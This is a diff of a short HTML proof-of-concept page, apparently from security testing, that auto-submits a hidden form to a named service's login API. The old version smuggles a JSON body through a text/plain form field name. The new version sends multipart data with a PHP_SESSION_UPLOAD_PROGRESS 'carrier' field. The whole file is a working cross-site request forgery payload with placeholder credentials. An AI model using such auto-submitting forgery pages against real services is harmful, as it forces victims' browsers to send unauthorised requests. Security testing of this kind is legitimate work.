@@ -1,8 +1,10 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-F3</title></head>
+<html><head><meta charset="utf-8"><title>ATK-MP</title></head>
 <body>
-<form id="f" method="POST" action="https://dashboard-api.swapped.com/api/v1/auth/login" enctype="text/plain">
-<input type="hidden" name='{"email":"poc-test@swapped.com","turnstile_token":"XXXX.DUMMY.TOKEN.XXXX","zzz":"' value='"}'>
+<form id="f" method="POST" action="https://dashboard-api.swapped.com/api/v1/auth/login" enctype="multipart/form-data">
+<input type="hidden" name="email" value="poc-test@swapped.com">
+<input type="hidden" name="turnstile_token" value="XXXX.DUMMY.TOKEN.XXXX">
+<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="poc-carrier">
 </form>
 <script>document.getElementById('f').submit();</script>
 </body></html>
